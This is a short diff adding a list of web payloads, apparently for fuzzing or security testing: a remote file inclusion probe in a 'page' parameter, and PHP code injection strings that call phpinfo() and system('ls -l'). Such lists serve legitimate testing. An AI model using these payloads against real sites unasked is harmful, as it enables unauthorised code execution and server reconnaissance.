@@ -1,0 +1,5 @@
+?page=http://google.com/
+
+?parameter=value;phpinfo();
+
+?parameter=value;system('ls -l');
